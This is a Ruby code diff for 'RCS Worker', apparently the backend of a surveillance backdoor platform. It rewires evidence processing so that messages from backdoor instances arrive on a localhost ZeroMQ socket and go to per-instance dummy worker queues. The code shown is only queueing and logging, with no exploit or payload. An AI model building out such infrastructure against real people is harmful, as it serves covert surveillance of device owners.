@@ -9,38 +9,152 @@ require 'rcs-common/evidence_manager'
 
 # from RCS::Audio
 require 'rcs-worker/audio_processor'
+require 'rcs-worker/config'
 require 'rcs-worker/evidence/call'
 
 # form System
 require 'digest/md5'
+require 'em-zeromq'
 require 'optparse'
 
 module RCS
 module Worker
 
-class Worker
+class DummyWorker
   include Tracer
   
+  SLEEP_TIME = 10
+  
+  def initialize(instance)
+    @instance = instance
+    @state = :stopped
+    @evidences = []
+    trace :info, "Issuing worker for backdoor instance #{instance}."
+  end
+
+  def stopped?
+    @state == :stopped
+  end
+  
+  def queue(evidence)
+    
+    process = Proc.new do
+      @state = :running
+      seconds_sleeping = 0
+      trace :debug, "[#{Thread.current}][#{@instance}] starting processing."
+      
+      while seconds_sleeping < SLEEP_TIME
+        until @evidences.empty?
+          ev = @evidences.shift
+          trace :debug, "[#{Thread.current}][#{@instance}] processing #{ev}."
+          sleep 1
+          seconds_sleeping = 0
+        end
+        
+        sleep 1
+        seconds_sleeping += 1
+      end
+      
+      trace :debug, "[#{Thread.current}][#{@instance}] sleeping too much, stopping!"
+      @state = :stopped
+    end
+    
+    trace :info, "queueing #{evidence} for #{@instance}"
+    @evidences << evidence
+    
+    if stopped?
+      trace :debug, "deferring work for #{@instance}"
+      EM.defer process
+    end
+    
+  end
+end
+
+class EMTestPullHandler
+  include Tracer
+  
+  attr_reader :received
+  
+  def initialize
+    @queue = {}
+  end
+  
+  def on_readable(socket, messages)
+    # each message is "<backdoor_instance>:<evidence_id>"
+    messages.each do |m|
+      msg = m.copy_out_string
+      instance, evidence = msg.split(":")
+      @queue[instance] ||= DummyWorker.new instance
+      @queue[instance].queue evidence
+    end
+  end
+  
+=begin
+  def initialize
+    @queue = []
+
+    @process = Proc.new do
+      result = []
+      until @queue.empty?
+        msg = @queue.shift
+        puts "#{Thread.current} #{msg}\n"
+        result << msg
+      end
+      result
+    end
+    
+    @callback = Proc.new do |status|
+      puts "processed #{status}\n"
+    end
+  end
+  
+  def on_readable(socket, messages)
+    messages.each do |m|
+      msg = m.copy_out_string
+      puts "Got message #{msg}\n"
+      @queue << msg
+    end
+    EM.defer @process, @callback
+  end
+  
+=end
+end
+
+class Worker
+  include Tracer
+
   attr_reader :type, :audio_processor
+
+  def setup(port = 5150)
+
+    # main EventMachine loop
+    begin
+
+      # all the events are handled here
+      EM::run do
+        # if we have epoll(), prefer it over select()
+        EM.epoll
+        
+        # set the thread pool size
+        EM.threadpool_size = 500
+        
+        ctx = EM::ZeroMQ::Context.new 1
+        
+        # setup one pull 0mq socket
+        ctx.connect ZMQ::PULL, "tcp://127.0.0.1:#{port}", EMTestPullHandler.new
+        trace :info, "Listening on port #{port}..."
+      end
+    rescue Exception => e
+      # bind error
+      if e.message.eql? 'no acceptor' then
+        trace :fatal, "Cannot bind port #{Config.global['LISTENING_PORT']}"
+        return 1
+      end
+      raise
+    end
   
-  def initialize(db_file, type)
-    
-    # db file where evidence to be processed are stored
-    @instance = db_file
-    
-    # type of evidences to be processed
-    @type = type
-    
-    @audio_processor = AudioProcessor.new
-    
-    trace :info, "Working on evidence stored in #{@instance}, type #{@type.to_s}."
-    
   end
-  
-  def get_key()
     
-  end
-  
   def process
     require 'pp'
     
@@ -93,7 +207,7 @@ class Application
   include RCS::Tracer
   
   # To change this template use File | Settings | File Templates.
-  def run(options, file)
+  def run(options) #, file)
     
     # if we can't find the trace config file, default to the system one
     if File.exist? 'trace.yaml' then
@@ -119,44 +233,23 @@ class Application
     begin
       version = File.read(Dir.pwd + '/config/version.txt')
       trace :info, "Starting a RCS Worker #{version}..."
-      w = RCS::Worker::Worker.new(File.basename(file), options[:type])
-      w.process
+      
+      # config file parsing
+      return 1 unless Config.load_from_file
+      
+      Worker.new.setup Config.global['LISTENING_PORT']
     rescue Exception => e
       trace :fatal, "FAILURE: " << e.to_s
       trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
       return 1
     end
     
-    puts w.audio_processor
-    
     return 0
   end
   
   # we instantiate here an object and run it
   def self.run!(*argv)
-    # This hash will hold all of the options parsed from the command-line by OptionParser.
-    options = {}
-    
-    optparse = OptionParser.new do |opts|
-      # Set a banner, displayed at the top of the help screen.
-      opts.banner = "Usage: rcs-worker [options] <database file>"
-        
-      # Default is to process ALL types of evidence, otherwise explicit the one you want parsed
-      options[:type] = :ALL
-      opts.on( '-t', '--type TYPE', [:ALL, :DEVICE, :CALL], 'Process only evidences of type TYPE' ) do |type|
-        options[:type] = type
-      end
-      
-      # This displays the help screen, all programs are assumed to have this option.
-      opts.on( '-h', '--help', 'Display this screen' ) do
-        puts opts
-        exit
-      end
-    end
-    
-    optparse.parse!
-    
-    return Application.new.run(options, ARGV.shift)
+    return Application.new.run argv
   end
 end
 
